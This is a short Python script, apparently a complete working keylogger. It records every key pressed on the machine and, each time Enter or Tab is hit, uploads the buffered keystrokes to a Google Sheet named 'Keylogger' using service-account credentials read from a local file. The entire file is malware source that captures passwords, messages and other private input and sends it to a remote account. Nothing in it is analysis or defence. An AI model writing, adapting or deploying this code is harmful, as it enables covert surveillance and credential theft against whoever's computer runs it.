import keyboard
import json
import gspread
from oauth2client.client import SignedJwtAssertionCredentials

buf = []
column = 0
row = 1

def write_to_spread(text):
    global column
    global row
    json_key = json.load(open('creds.json')) # json credentials you downloaded earlier
    scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']

    credentials = SignedJwtAssertionCredentials(json_key['client_email'], json_key['private_key'].encode(), scope) # get email and key from creds

    file = gspread.authorize(credentials) # authenticate with Google
    sheet = file.open("Keylogger").sheet1 # open sheet

    if (column > 25):
        column = 0
        row += 1

    cell = chr(ord('A') + column) + str(row)
    sheet.update_acell(cell, text)
    column += 1

def foo(e):
    global buf
    if e.name == "enter" or e.name == "tab":
        write_to_spread(''.join(buf))
        buf = []
    elif e.name == "backspace":
        if (buf):
            buf.pop()
    elif e.name == "space":
        buf.append(" ")
    else:
        buf.append(e.name)

def start():
    keyboard.on_press(foo)
    while True:
        """Run forever"""

if __name__ == "__main__":
    start()
